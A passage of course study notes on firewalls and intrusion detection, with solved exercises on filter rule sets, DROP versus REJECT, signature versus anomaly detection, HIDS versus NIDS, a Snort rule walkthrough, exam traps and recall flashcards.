| 6    | Any        | Any      | 172.16.20.5 | 444 to 65535 | Deny                 |
| 7    | Any        | Any      | Any         | Any          | **Allow** (implicit) |

The implicit rule at the end is **allow all**. Rule 1 must come before rule 2, because rules
run top to bottom and the administrator's SSH is the exception. Rules 4 to 6 exist only
because the requirement says "others: no". A negative filter cannot express that without
enumerating every port to block (rule 3 is then redundant with rule 4, kept for clarity).

**5. Pros and cons of both implementations.**

| Aspect           | Positive filter (default discard)           | Negative filter (default forward)         |
| ---------------- | ------------------------------------------- | ----------------------------------------- |
| Security         | Conservative: a forgotten service is closed | Reduced: a forgotten service is open      |
| Rules            | 3 short rules, one per permitted service    | 6 rules with port ranges for "others: no" |
| New service      | Add one permit rule                         | Punch a hole in a range, risk of error    |
| New threat       | Already blocked                             | The administrator must react to each      |
| Users            | See an obstacle at first                    | Easier for end users                      |
| Misconfiguration | A wrong rule opens one service              | A wrong range opens many                  |
| Who (slide 466)  | Business and government                     | Open organisations, universities          |

For a corporate web server the positive filter is the correct choice: the requirement table
is itself a whitelist.

### Section 5: DROP versus REJECT

**1. The technical difference between DROP (deny, discard) and REJECT. What does the
firewall send back?**

On the slides, discard is the action of the packet filter (slide 465) and stealth mode drops
unsolicited packets so that the system appears absent (slide 500). Beyond the slides:
**DROP** discards the packet silently and sends **nothing** back. **REJECT** discards the
packet and sends an error back to the sender: an ICMP error message (destination or port
unreachable, or administratively prohibited) for UDP and other protocols, or a TCP reset for
TCP.

**2. Which TCP flag does the REJECT response carry?**

Beyond the slides: the **RST** (reset) flag. The firewall simulates a host that refuses the
connection, which is exactly what a host does when a SYN arrives at a closed port.

**3. Why is DROP a stealth technique against port scans? How does silence affect the
attacker's conclusion and timing compared with REJECT?**

With REJECT the attacker gets an immediate answer for every probe: an RST means "port closed,
host alive", so the scan finishes fast and the attacker learns which hosts exist and which
ports are filtered versus closed. With DROP nothing comes back. The attacker cannot tell a
filtered port from a host that does not exist, which is the stealth mode of slide 500: the
system appears not to be present. The attacker's scanner must wait for a **timeout** on each
probe and usually retransmit, so the scan takes much longer, and the result is "filtered",
not "closed". The cost is on the attacker's side, and the firewall reveals nothing.

---

## 5. Exercise list 9, solved (IDS/IPS)

### Section 1: intrusion detection and prevention

**1. Define an intrusion.**

A security intrusion is an unauthorised act of bypassing the security mechanisms of a system
(slide 522). NIST SP 800-61 examples (slides 513 and 514): remote root compromise of a mail
server, web defacement, password cracking, copying a card database, sniffing passwords,
social engineering.

**2. Define an IDS.**

An intrusion detection system: a hardware or software function that collects and analyses
information from several areas of a computer or network to identify possible intrusions
(slide 522). Three logical components: sensors (collect), analysers (decide), user interface
(slide 523). Classified as HIDS, NIDS or distributed (slide 524).

**3. Define an IPS.**

An intrusion prevention system: an IDS that is placed inline, so the traffic must pass
through it, and that **blocks** an attack when it detects one (slide 552). It combines
detection with an automatic response.

**4. The fundamental difference between them in terms of action.**

The IDS **detects and alerts**: it logs the suspicious event and notifies the administrator,
who responds (slide 543: detect, log, alert). It can run on a passive sensor that sees a copy
of the traffic. The IPS **prevents**: it drops or blocks the traffic itself, which requires an
inline sensor. The price of the IPS is that a false positive blocks legitimate traffic, and the
inline position adds delay (slide 552).

**5. Why a packet filter firewall can be insufficient for intrusion detection.**

The packet filter sees only L3 and L4 headers (slide 465). It cannot examine the payload, so
it cannot detect attacks that use application vulnerabilities (slide 474), its logs hold only
addresses and traffic type (slide 474), it keeps no context between packets (slide 478), and
it is bypassed by spoofing and tiny fragments (slides 476 and 477). An attack that arrives on
a permitted port, such as an exploit inside an HTTP request, passes it. Intrusion detection
needs the payload (signatures such as the Snort `content` option), the sequence of packets
(the pattern of a scan), and host data (system calls, file integrity), which only an IDS
collects. Also, the firewall never sees traffic that bypasses it or insider activity
(slide 461).

### Section 2: detecting an intrusion

**1. Define and contrast signature detection and anomaly detection.**

- **Signature (or heuristic) detection, misuse detection:** a set of known malicious patterns
  or attack rules; the observed behaviour is compared with them, and a match means an
  intruder (slide 540). It describes what is **bad**.
- **Anomaly detection:** data on legitimate behaviour over time builds a baseline of normal;
  observed behaviour is compared with the model and classified as legitimate or anomalous
  (slides 533 and 534). It describes what is **normal**. It has a training phase and a
  detection phase, and three classification categories: statistical, knowledge-based,
  machine learning (slide 535).

**2. Which approach is more effective for each type of behaviour, and why?**

For **known, catalogued** behaviour: signature detection. It is cheap at run time, widely
accepted, and precise when the signature has enough detail (slide 541). For **unknown**
behaviour: anomaly detection. A new attack matches no signature, so only a deviation from the
baseline reveals it (slides 541 and 548). The cost is a higher false alarm rate, because
legitimate and attack behaviour overlap (slides 526 and 527).

**3. Signature versus anomaly on four criteria.**

- **Zero-day attacks:** signature detection cannot detect them, no signature exists
  (slides 541 and 548). Anomaly detection can, if the attack deviates from the baseline.
- **False positive rate:** signature detection is lower, a detailed signature rarely matches
  legitimate traffic. Anomaly detection is higher: the overlap between normal and attack
  behaviour (slide 527), the base-rate fallacy (slide 529), and the machine learning rate
  currently unacceptably high (slide 538).
- **Computational and maintenance cost:** signature detection has relatively low run time cost
  (slide 541), but needs significant effort to identify new behaviour and write signatures.
  Anomaly detection depends on the category: statistical is simple and cheap (slide 536),
  knowledge-based needs human experts and time for high quality rules (slide 537), machine
  learning needs much time and resources to train, then classifies efficiently (slide 538).
- **Adaptability to new threats:** signature detection needs a new signature for each new
  attack. Anomaly detection adapts, since the model can evolve continuously (slide 534), and
  machine learning is flexible and adaptable (slide 538). Requirement 6 of an IDS is to adapt
  to changes in behaviour over time (slide 531).

### Section 3: NIDS and HIDS

**1. Define and contrast HIDS and NIDS.**

- **HIDS:** a specialised layer of security software on a vulnerable or sensitive host
  (database servers, administrative systems). It monitors the activity inside the system:
  system call traces, audit records, file integrity checksums, Registry access (slides 543
  to 545). Purposes: detect, log, alert. Uses both analysis approaches.
- **NIDS:** monitors traffic at selected points of the network, packet by packet, in real
  time, at L3, L4 and L7. Part of the perimeter, focused on external attempts. Architecture:
  sensors, management servers, consoles (slide 550).
- **Contrast (slide 550):** the NIDS examines the packet traffic directed at the systems; the
  HIDS examines the activity of users and software inside a host. The NIDS covers many hosts
  with one sensor but loses encrypted payload (slide 552); the HIDS sees decrypted data and
  local events but covers one host and consumes its resources.

**2. Which approach for each scenario, and why.**

- **Malware making anomalous system calls: HIDS.** System call traces are the preferred
  HIDS source (slide 544), and STIDE compares the observed call sequences with normal ones
  (slide 547). The network never sees a system call.
- **Port scan on the corporate network: NIDS.** A scan is a pattern of packets to many
  ports or hosts. The NIDS sees the traffic of a whole segment (slide 550), and an external
  honeypot tracks scans of unused addresses too (slide 558).
- **Exploit attempts on a web server: NIDS.** The attempts arrive as HTTP requests over the
  network and match signatures (Snort rules, slide 542). If the server uses HTTPS, the NIDS
  is blind (slide 552) and a HIDS on the server is needed.
- **Unauthorised access to sensitive files: HIDS.** File integrity checksums and audit
  records are host sources (slides 544 and 545), and honeyfiles raise an alert on access
  (slide 560). The NIDS sees a file transfer only if it crosses the network in the clear.

**3. Can combined use of NIDS and HIDS improve detection in those scenarios? Justify.**

Yes. A distributed or hybrid IDS combines the sensors in a central analyser and identifies
and responds to intrusion better (slide 524), and a distributed HIDS cooperating over the
network is the more effective defence (slide 549).

- **Anomalous system calls:** the HIDS detects the malware; the NIDS adds how it arrived
  (a download, a spear-phishing link) and whether it talks to a command server, which also
  reveals other infected hosts.
- **Port scan:** the NIDS detects the scan; a HIDS on the scanned hosts confirms whether any
  probe became a login or a service crash. Small gain, the NIDS alone is adequate.
- **Web server exploits:** the largest gain. The NIDS sees the request on the wire, the HIDS
  sees the effect on the server (new processes, system calls, modified files), and it covers
  the HTTPS case where the NIDS is blind.
- **Sensitive file access:** the HIDS detects the access; the NIDS detects the exfiltration
  of a large number of documents to an external repository (slide 520), which is lateral
  movement or data theft visible only on the network.

**4. The step by step operation of Snort as a NIDS, from packet capture to alert.**

From the figure on slide 551:

1. **Network traffic** arrives at the sensor, through a tap or an inline position
   (slides 552 and 553).
2. The **packet decoder** parses the protocol headers (Ethernet, IP, TCP) into a structure.
3. The **preprocessor** normalises and reassembles: streams, fragments, protocol specific
   decoding, so that the rules see the real payload.
4. The **detection engine** compares the packet with the **rules**: header match (action,
   protocol, addresses, ports, direction), then options (`flow`, `content`, `depth`,
   `threshold`).
5. On a match, the **logging and alerting system** generates the event with the rule's
   `msg`, `classtype` and `sid`.
6. The **output modules** write it to the configured destination: alert file, log, database,
   or console.

**5. A significant limitation of the NIDS with encrypted traffic, and a complementary
strategy.**

With TLS/SSL the NIDS loses access to the payload: it cannot see malicious commands inside an
HTTPS session, so content signatures do not match (slide 552). Strategies: use a **HIDS** on
the endpoints, which sees the data after decryption (system calls, files, logs), as part of a
distributed IDS (slides 524 and 549); terminate the encryption at an **application-level
gateway** or at the firewall, where IPsec should live so that the firewall sees cleartext
(slides 482 and 506), and place the NIDS sensor behind that point; and still use the NIDS on
what remains visible, the headers and traffic patterns (scans, connection rates, flows).
The slide's conclusion: the NIDS is only part of the solution, defence in depth.

### Section 4: the Snort rule

**1. What each part of the header specifies.**

- **Action:** `alert`, generate an alert when the condition is met.
- **Protocol and direction:** `tcp`, only TCP; `->`, from the source on the left to the
  destination on the right.
- **Source and destination addresses:** `$HOME_NET`, the internal network, to
  `$EXTERNAL_NET`, the external network.
- **Ports:** source `any`; destination `![7680,1521]`, any port except 7680 and 1521.

**2. The function of each option.**

- `flow:established,to_server`: only considers TCP connections already established, in the
  direction of the server (slide 563). It ignores the handshake and the server's replies.
- `content:"|00 00 00 0d 06 00|"; depth:6`: searches for the byte sequence
  00 00 00 0d 06 00 (the pipes mark hexadecimal bytes), and only within the first 6 bytes of
  the payload. The pattern must be at the very start of the data.
- `threshold: type limit, track by_dst, seconds 300, count 1`: avoids multiple alerts, one
  alert per destination address every 300 seconds (slide 564).

**3. Which detection approach does this rule represent? Justify.**

**Signature detection.** The rule describes a known pattern of malicious or unwanted data: a
fixed byte sequence at a fixed position of the payload, in a known protocol state, which is
the BitTorrent peer synchronisation message documented in the referenced protocol page.
The behaviour is compared with the pattern and a match raises the alert (slides 540 and 541).
Nothing in the rule models normal behaviour or a baseline, and there is no training phase, so
it is not anomaly detection. Snort is the slide's example of a rule based NIDS (slide 542).
Its limits are the limits of signatures: a client that changes the handshake bytes, or runs
on port 7680, is not detected, and a new protocol needs a new rule.

---

## 6. Numbers and traps

### Numbers to memorise

| Item                                  | Value                                                                  |
| ------------------------------------- | ---------------------------------------------------------------------- |
| System evolution stages               | 6: mainframe, LAN, premises, enterprise WAN, Internet, cloud           |
| Firewall design goals [BELL94]        | 3: all traffic passes, only authorised passes, immune itself           |
| NIST SP 800-41 policy characteristics | 4: address and protocol, application protocol, user identity, activity |
| Firewall capabilities / limitations   | 4 / 4                                                                  |
| Packet filter rule fields             | 5: src IP, dst IP, ports, IP protocol, interface                       |
| Packet filter advantages / weaknesses | 3 / 5 (NIST SP 800-41)                                                 |
| Table 9.1 SMTP rules                  | 5 rules; port 25; replies > 1023; rule 5 deny                          |
| SMTP exploit                          | attacker port 5150 to internal proxy port 8080                         |
| Well-known port / client port         | < 1024 / > 1024 (example 49152)                                        |
| Firewall types                        | 4: packet filter, stateful, application-level, circuit-level           |
| SOCKS                                 | version 5, RFC 1928, TCP port 1080                                     |
| Bastion host software size            | mail app 20,000+ lines, mail proxy under 1,000                         |
| Personal firewall FTP data ports      | 1024 to 65535 after a connection from 20 or 21                         |
| Personal firewall implementations     | netfilter (Linux), pf (BSD, macOS), Windows Firewall                   |
| Internal firewall purposes            | 3: stricter filtering, two-way DMZ protection, segmentation            |
| Intruder classes                      | 4: cyber criminals, activists, APTs, others                            |
| Attack methodology steps              | 6: target, access, escalate, exploit, maintain, cover tracks           |
| IDS logical components                | 3: sensors, analysers, user interface                                  |
| IDS motivations / requirements        | 3 / 9                                                                  |
| Anomaly detection phases / categories | 2 (training, detection) / 3 (statistical, knowledge, ML)               |
| Machine learning approaches           | 6: Bayesian, Markov, neural, fuzzy, genetic, clustering                |
| HIDS data sources                     | 4: system calls, audit records, file checksums, Registry               |
| NIDS sensor modes                     | 2: inline (IPS), passive (tap, NIC without IP)                         |
| Honeypot objectives / positions       | 3 / 3 (external, DMZ, internal)                                        |
| Snort rule: excluded ports            | 7680 and 1521                                                          |
| Snort rule: content / depth           | 00 00 00 0d 06 00 / 6 bytes                                            |
| Snort rule: threshold                 | 1 alert per destination per 300 seconds                                |
| Snort rule: sid / rev                 | 2000334 / 14                                                           |
| OWASP Top 10 code flaws on the slide  | 5                                                                      |
| CWE/SANS Top 25 categories            | 3: insecure interaction, risky resources, porous defences              |
| Typical fixed buffers                 | 512 or 1024 bytes; the example uses 10 bytes                           |
| Heartbleed                            | OpenSSL, 2014, buffer over-read                                        |
| Fuzzing                               | Barton Miller, 1989                                                    |
| Malicious compiler                    | Ken Thompson, 1984                                                     |
| Morris Worm                           | DEBUG command in sendmail                                              |
| Canonicalisation example              | "/" is 2F; IIS flaw in the 1990s                                       |
| Critical interaction areas            | 4: input, algorithm, other components, output                          |
| Standard cited                        | ISO 12207 software life cycle                                          |

### Traps

1. **A positive filter ends with deny, a negative filter ends with allow.** Not the reverse.
2. **The stateful firewall still reads the same headers as the packet filter.** It adds the
   connection state, it does not replace the rules.
3. **The circuit-level gateway does not examine the payload.** Only the application-level
   gateway does.
4. **SOCKS is not a network layer gateway.** It is a shim between application and transport,
   and it does not forward ICMP.
5. **The refined rule 4 needs both source port 25 and the ACK flag.** Source port alone is
   defeated by an attacker who runs a service on port 25.
6. **The tiny fragment attack is not about size limits.** It splits the TCP header away from
   the first fragment, on which the filter decides.
7. **IPsec behind the firewall blinds the firewall.** IPsec in the boundary router is less
   secure. The answer is IPsec in the firewall.
8. **The internal firewall protects in both directions.** The DMZ is also protected from the
   internal network.
9. **An IDS detects and alerts; an IPS blocks.** The IPS needs an inline sensor.
10. **Signature detection cannot see zero-day attacks.** Anomaly detection can, at the price
    of more false alarms.
11. **Insiders are the hardest case (Anderson).** Anomaly search alone is insufficient for them.
12. **The base-rate fallacy:** intrusions are rare, so even a good IDS produces many false
    alarms. High detection and low false alarms are extremely hard together.
13. **The NIDS loses on encrypted traffic.** It is part of the solution, not the solution.
14. **System call traces are the preferred HIDS source on Unix, and problematic on Windows**
    because of DLLs.
15. **Antivirus is signature HIDS.** It is very efficient on known malware and useless on
    zero-day.
16. **A honeypot that starts outbound traffic was compromised.** Any inbound traffic to it is
    suspicious.
17. **Low interaction emulates; high interaction is a real system** and the bigger legal risk.
18. **The Snort rule is signature detection**, with no baseline and no training.
19. **Heartbleed is a buffer over-read, not an overflow.** The code read more than it was given.
20. **"stack smashing detected" is the GCC protection, not the attack.** The attack needs
    `-fno-stack-protector` to reproduce.
21. **XSS targets the next user, not the server.** It is a failure of input and output handling.
22. **Whitelist, do not blacklist.** Blacklists fail on every new evasion.
23. **Canonicalise before validating.** Otherwise an alternate encoding of "/" passes the filter.
24. **Unsigned to signed casts invert size checks.** A huge value becomes negative and passes.
25. **Environment variables are input.** PATH and LD_LIBRARY_PATH attack privileged scripts.

---

## 7. Recall decks

### 7.1 Deck F: firewalls

Source: Part 1 and section 4.

**F1.** State the firewall dilemma and the six stages of system evolution. Why is per host
security not enough?

Protect the internal assets and still allow access to WANs and the Internet.
Stages: mainframe with terminals; LANs; premises network of several LANs; enterprise-wide
network over a private WAN; Internet connectivity; enterprise cloud with virtualised servers.
Per host security: thousands of systems with several OSs must each be patched when a flaw
appears; needs scalable configuration management and aggressive patching; hard and sometimes
not cost effective. The firewall is the accepted alternative or complement.

**F2.** Define the perimeter, the choke point and defence in depth. State the three design
goals of [BELL94] and how each is achieved.

Perimeter: the wall between the premises network and the Internet. Choke point: one
point where security and auditing are imposed; one system or several cooperating. Defence in
depth: the firewall is an extra layer isolating the internal systems, classical military
doctrine. Goals: all traffic passes the firewall, by physically blocking every other path;
only policy authorised traffic passes; the firewall is immune to penetration, through a
hardened system with a secure OS.

**F3.** What is the access policy, where does it come from, and what four characteristics
can it filter on (NIST SP 800-41)?

The list of traffic types authorised to pass, by address ranges, protocols,
applications, content types. Developed from the risk assessment and the information security
policy: broad specification, refined to filter elements, implemented in the topology.
Characteristics: IP address and protocol (packet filters, stateful); application protocol
(proxy: SMTP spam, HTTP sites); user identity (inside users, needs IPsec); network activity
(time of day, request rate against scanning, patterns).

**F4.** Four capabilities and four limitations of a firewall.

Capabilities: single choke point (keeps unauthorised users out, blocks vulnerable
services, protects against spoofing and routing attacks, simplifies management); monitoring
location (audits, alarms); platform for NAT and network management logs; platform for IPsec
VPNs in tunnel mode. Limitations: attacks that bypass it (own ISP link, partner links);
internal threats (disgruntled employee, phishing victim); insecure wireless LANs; infected
portable devices (BYOD).

**F5.** Positive versus negative filter, and default discard versus default forward:
mottoes, security, users, who uses each.

Positive filter passes only matching packets, deny at the end. Negative filter rejects
matching packets, allow at the end. Default discard: "not expressly permitted is prohibited",
more secure, everything blocked then added case by case, visible to users as an obstacle,
business and government. Default forward: "not expressly prohibited is permitted", easier for
users, reduced security, admin reacts to each new threat, open organisations such as
universities.

**F6.** Five fields a packet filter uses. Three advantages and five weaknesses.

Source IP, destination IP, source and destination port, IP protocol field (TCP, UDP,
ICMP), interface. Advantages: simplicity, transparency, speed (no payload). Weaknesses: no
upper layer data (cannot block application commands); limited logging; no advanced user
authentication; vulnerable to TCP/IP stack attacks such as spoofing; prone to
misconfiguration because of few variables.

**F7.** Table 9.1: the five SMTP rules, the flaw in rule 4, the exploit, the two refinements,
and why the ACK flag works.

Rule 1 in, external to internal, TCP, dest 25, permit. Rule 2 out, dest > 1023,
permit. Rule 3 out, dest 25, permit. Rule 4 in, dest > 1023, permit. Rule 5 either, any, deny.
Flaw: rule 4 lets external traffic reach any port above 1023. Exploit: attacker port 5150 to
internal proxy port 8080. Refinement 1: source port 25 on rules 2 and 4, source port > 1023
on rules 1 and 3. Remaining hole: an attacker runs a service on port 25 and sends from source
port 25. Refinement 2: rule 4 requires the ACK flag, because a packet of an established
connection always has ACK, and a packet starting a connection has SYN without ACK.

**F8.** IP spoofing and tiny fragment: mechanism and countermeasure of each.

Spoofing: packets from outside carry an internal trusted source address to pass
address based security; countermeasure: discard packets arriving on the external interface
with an internal source address. Tiny fragment: IP fragmentation pushes the TCP header with
the ports into a later fragment, the filter decides on the first fragment and lets the rest
through; countermeasure: require a minimum amount of transport header in the first fragment,
and if it is rejected remember the packet ID and discard the following fragments.

**F9.** The lack of context problem: ports, numbers, and the stateful solution with its table.

The stateless filter decides packet by packet with no knowledge of connections.
Server: fixed well-known port below 1024 (SMTP 25). Client: temporary port above 1024
(49152). To let replies in, every high port must be open inbound. Stateful: a state table of
active outbound TCP connections (source address and port, destination address and port,
state, for example 192.168.1.100:1030 to 210.9.88.29:80 established); inbound traffic to a
high port is accepted only if it matches an entry. Also tracks TCP sequence numbers against
session hijacking and does limited DPI for FTP, IM, SIPS.

**F10.** Write the positive filter and the negative filter for the list 8 web server.
Name the implicit rules.

Positive: any:>1023 to 172.16.20.5:80 permit; any:>1023 to 172.16.20.5:443 permit;
10.0.0.100:>1023 to 172.16.20.5:22 permit; implicit deny all. Negative: 10.0.0.100 to :22
permit (exception first); any to :22 deny; any to :21 deny; any to :1-79, :81-442,
:444-65535 deny; implicit allow all. The negative filter needs ranges to express "others: no".

**F11.** Application-level gateway: mechanism, four properties, the GET and POST example.

A relay at application level: the user contacts the gateway, gives the remote host
and credentials, the gateway opens its own connection to the server and relays segments; two
spliced connections, no end-to-end. Granular control: no proxy code, no service; permit HTTP
GET, deny POST. More secure: a few applications instead of countless IP, port, flag
combinations. Easy logging and auditing at application level. Disadvantage: processing
overhead on both connections.

**F12.** Circuit-level gateway: mechanism, key difference, the hybrid use. SOCKS: version,
RFC, port, position, components, the five TCP steps, UDP handling.

Two TCP connections, internal host to gateway and gateway to external host; once
established it relays segments without examining the payload; security is only which
connections are permitted. Hybrid: trusted inside users, application proxy inbound
(expensive, secure), circuit-level outbound (cheap). SOCKS v5, RFC 1928, server on TCP
port 1080; a shim layer between application and transport, not a network gateway, no ICMP.
Components: SOCKS server on the firewall, client library on internal hosts, SOCKS-ified
clients relinked. TCP: connect to 1080, negotiate authentication, authenticate, send a relay
request (IP and port), the server evaluates and connects. UDP: a TCP control connection to
1080 only to authenticate, then UDP segments are relayed while it stays open.

**F13.** Bastion host: definition and nine characteristics, with the line count numbers.

A system identified by the administrator as a critical strong point; the platform
for application and circuit gateways and services such as IPsec; a hardened system with a
secure OS. Characteristics: only essential services (proxies for DNS, FTP, HTTP, SMTP);
extra authentication before the proxies and per proxy; each proxy supports a command subset;
each proxy allows only specific internal hosts; detailed audit logs per proxy; very small
software (mail app 20,000+ lines, proxy under 1,000), easier to audit; independent proxies,
one can be removed, new services added; no disk access beyond the initial configuration, so
executable file systems can be read only against Trojans and sniffers; each proxy runs as a
non-privileged user in a private directory.

**F14.** Host-based, network device, virtual and personal firewalls: what each is and its
advantages. Personal firewall implementations, default policy, FTP rule, four advanced
features.

Host-based: a software module protecting one host, often a server; tailored rules,
topology independent protection, extra layer so new servers need no network firewall change.
Network device: packet filtering and stateful inspection in routers and switches, extra
layers. Virtual: a virtualised bastion host as a VM, or firewall functions in the hypervisor.
Personal: between a PC and the network, at home or in intranets, as software on the PC or in
the home router; simpler; denies unauthorised remote access and monitors outgoing activity
for worms; netfilter, pf, Windows Firewall; CLI or GUI. Default: inbound denied except what
the user permits, outbound permitted. FTP: ports 20 and 21 open, and after a connection from
20 or 21, ports 1024 to 65535 open for data. Advanced: stealth mode (drop unsolicited
packets), UDP blocking, logging, application filter (only selected or CA signed applications).

**F15.** DMZ: what sits where, what lives in it, the three purposes of the internal firewall.

External firewall at the edge after the boundary router; internal firewall(s)
protecting the enterprise network; the DMZ between them with the web site, SMTP server and
DNS server. External firewall: moderate protection for the DMZ, basic for the rest. Internal
firewall: stricter filtering; two-way protection, the internal network from a compromised DMZ
server (malware, rootkits, bots) and the DMZ from the internal network; internal segmentation
with several firewalls (servers versus workstations).

**F16.** VPN: problem, solution, protocol, and the three IPsec positions with their problems.

Problem: dispersed LANs must interconnect; the Internet is cheaper and easier than
private lines but exposes traffic to eavesdropping and unauthorised access. Solution: a VPN,
computers interconnected over an insecure network with encryption and authentication at lower
layers, same system at both ends. Protocol: IPsec; the IPsec device encrypts and compresses
all traffic to the WAN and reverses it on the way in, transparently; a remote user's
workstation can run IPsec but becomes an attractive target. Positions: behind the firewall,
the firewall cannot filter, scan, log or control encrypted traffic; in the boundary router,
less secure than the firewall; in the firewall itself, the functional choice.

**F17.** Distributed firewalls: components, key characteristic, advantages.

Stand-alone network firewalls plus host-based firewalls on servers and workstations,
under central administrative control; tools let the administrator set policies and monitor
hundreds of host and personal firewalls, local and remote. Advantages: protection against
internal attacks, protection tailored to machines and applications.

**F18.** DROP versus REJECT: what is sent back, the TCP flag, why DROP is stealth.

DROP discards silently, nothing goes back; REJECT discards and sends an error, an
ICMP error or a TCP reset (beyond the slides). The flag is RST. Stealth: with REJECT the
attacker gets an immediate "closed, host alive" per probe; with DROP each probe waits for a
timeout and retransmits, the port reads "filtered", and the host appears absent, which is
the stealth mode of slide 500.

### 7.2 Deck D: IDS/IPS, honeypots and Snort

Source: Part 2 and section 5.

**D1.** Outsiders versus insiders, and the four classes of intruder with motivation and
examples.

Most violations by outsiders, some by insiders, insiders can be much more dangerous;
targeted attacks bypass perimeter defences, hence defence in depth. Cyber criminals:
financial reward, identity and credential theft, espionage, data theft or ransom, underground
forums (DarkMarket). Activists: social or political causes, often low skill, defacement, DoS,
leaks; Anonymous, LulzSec, Manning, Snowden. APTs: state sponsored espionage or sabotage,
secret and persistent; China, Russia, USA, UK. Others: classic hackers for challenge and
reputation (found buffer overflow), hobby hackers with toolkits, recruitable.

**D2.** Where do IDS/IPS work well and where do they fail? Why?

Reasonably effective against known, less sophisticated attacks: activist groups,
large scale e-mail scams. Less effective against sophisticated targeted attacks by cyber
criminals and APTs, because they use zero-day exploits and hide their activity. Hence part of
defence in depth with cryptography, audit trails, strong authentication, active management.

**D3.** The common attack methodology and its six steps, with one example each.

Phishing, malware installation, credential theft, compromise. Target acquisition and
information gathering: OSINT, DNS and WHOIS, NMAP, probe e-mail, vulnerable CMS. Initial
access: brute force the CMS password, plugin exploit, spear-phishing with a browser exploit.
Privilege escalation: local exploits to root, sniffers for admin passwords. Information
gathering or exploitation: scan files for financial data and PII, exfiltrate documents,
lateral movement with captured passwords. Maintaining access: RAT or rootkit backdoor, keep
the admin password, disable antivirus or IDS. Covering tracks: rootkit hides files, edit logs.

**D4.** Define security intrusion, intrusion detection, and the three logical components of
an IDS. Classify by data source.

Intrusion: an unauthorised act of bypassing the security mechanisms of a system.
Intrusion detection: a hardware or software function that collects and analyses information
from several areas of a computer or network to identify possible intrusions. Components:
sensors (collect packets, logs, system calls and forward), analysers (decide, with evidence
and guidance; data may be stored), user interface (view and control). Architecture: simple
(one sensor, one analyser) or distributed (many sensors, central analyser). Classes: HIDS
(one host: PIDs, system calls), NIDS (traffic of segments), distributed or hybrid (combines
both, better identification and response).

**D5.** Three motivations for an IDS. The fundamental assumption and its consequence.

Fast detection (eject the intruder before damage; earlier means less damage, faster
recovery), deterrent effect, information gathering to strengthen prevention (firewall rules,
patches). Assumption: intruder behaviour differs from legitimate behaviour in quantifiable
ways. No crisp distinction exists, so overlap and therefore false positives and negatives;
the analyser minimises the overlap.

**D6.** The loose versus tight trade-off. The classical view on outsiders and insiders.
The base-rate fallacy.

Loose interpretation catches more intruders and produces many false positives
(authorised users flagged). Tight limits false positives and raises false negatives (missed
intruders). Goal: maximise detection rate, minimise false alarm rate; a compromise and an
art. Classical view: outsiders are distinguishable with reasonable confidence from historical
patterns and significant deviations; insiders are the hardest (Anderson), the difference
between their abnormal and normal behaviour is tiny, anomalies alone are insufficient, so use
intelligently defined rules of unauthorised use. Base-rate fallacy: intrusions are very rare
compared with legitimate use, so unless the IDS is almost perfect the false alarm rate is high;
frequent false alarms get ignored or waste time, a low detection rate gives false security.

**D7.** The nine requirements of an IDS.

Run continuously with minimal supervision; fault tolerant, recovers from crashes;
resists subversion, monitors itself; minimal overhead; configurable to the security policy;
adapts to changes in system and user behaviour; scales to many hosts; avoids complete stop of
service when components fail; dynamic reconfiguration without restart.

**D8.** Anomaly detection: the two phases and the three categories, with advantages and
disadvantages of each. Six machine learning approaches.

Training phase builds the model of legitimate behaviour from sensor data in normal
operation (at distinct moments or continuously); detection phase compares observed behaviour
with the model and classifies it. Statistical: univariate (crude), multivariate
(correlations), time series (order and timing); simple, cheap, no assumptions; hard to pick
metrics, not all behaviour fits. Knowledge-based: expert system rules, possibly manual,
finite state machines and description languages; robust and flexible; rules are slow and hard
to write, need human experts. Machine learning: data mining builds the model from normal
training data; flexible, adaptable, captures complex interdependencies, efficient once
trained; depends on assumptions about accepted behaviour, false alarm rate currently
unacceptable, training costs much time and resources. Approaches: Bayesian networks, Markov
models, neural networks, fuzzy logic, genetic algorithms, clustering and outlier detection.

**D9.** Signature versus heuristic detection: how, where used, advantages, disadvantages,
the rule source, the example system.

Misuse detection: a set of known malicious patterns or attack rules; a match means an
intruder. Signatures compare data with known malicious patterns, detailed enough to limit
false alarms yet catch enough; used in antivirus, traffic scanning proxies, NIDS; low cost,
wide acceptance; significant effort to build signatures, no zero-day. Heuristics use rules
for known attacks or known weaknesses and suspicious behaviour even inside normal patterns;
best source is analysing attack tools and scripts from the Internet plus expert rules;
specific to machine and OS. Snort is the rule based NIDS with a large rule collection.

**D10.** Signature versus anomaly on zero-day, false positives, cost, adaptability.

Zero-day: signature no, anomaly possible. False positives: signature low, anomaly
higher (overlap, base rate, ML unacceptable today). Cost: signature low at run time, effort
to write and review; anomaly depends, statistical cheap, knowledge-based needs experts, ML
expensive to train then efficient. Adaptability: signature needs a new signature per attack;
anomaly evolves with behaviour, ML flexible; requirement 6 of an IDS.

**D11.** HIDS: definition, purposes, four data sources with advantage and disadvantage.

A specialised security software layer on vulnerable or sensitive systems (database
servers, administrative systems), monitoring activity inside; detect intrusions, log
suspicious events, send alerts; both approaches. System call traces: preferred, works on
Unix and Linux, problematic on Windows because DLLs obscure which process calls what. Audit
records: already collected by the OS, no extra software; may lack information or format,
intruders manipulate them. File integrity checksums: periodic hash of critical files against
a baseline; the good checksums must be generated and protected, files that change
legitimately are hard. Registry access: Windows, lots of program activity there; very
specific, limited success. Sensor: collect, filter to a standard format, forward.

**D12.** Anomaly HIDS on Linux: why system calls, STIDE, the four ML engines. Signature
HIDS: what it is the basis of, two techniques, limit.

Most anomaly HIDS work was on UNIX and Linux, easy data collection; system calls are
how programs reach the kernel and give detailed process activity. STIDE compares observed
call sequences with normal training sequences for a mismatch ratio. Alternatives: HMM, ANN,
SVM, ELM. Performance: detection rate, false positives, detection speed. Signature HIDS is the
basis of antivirus, on PCs, mobiles, e-mail and web proxies, NIDS; signatures (file patterns
of known malware) and heuristics (rules of known malicious behaviour); very efficient on known
malware, cannot detect zero-day; widely used on Windows.

**D13.** NIDS: definition, layers, contrast with HIDS, architecture, the encryption
limitation.

Monitors traffic at selected points, packet by packet, real time or near it, at L3,
L4 and L7. NIDS examines packet traffic directed at systems, HIDS examines user and software
activity inside a host. Part of the perimeter infrastructure, in or beside the firewall,
focused on external attempts. Sensors, management servers, management consoles. With TLS/SSL
the NIDS lost access to meaningful payload (cannot see commands in HTTPS); important but only
part of the solution.

**D14.** Inline versus passive sensor. The passive configuration with the tap and two NICs.
Wireless sensors and WIDS.

Inline: in the segment, traffic passes through it, may be combined with a firewall
or switch, can block, acts as IDS and IPS. Passive: most common, monitors a copy, real traffic
does not pass, more efficient, no delay. Configuration: a tap on the medium (fibre) gives a
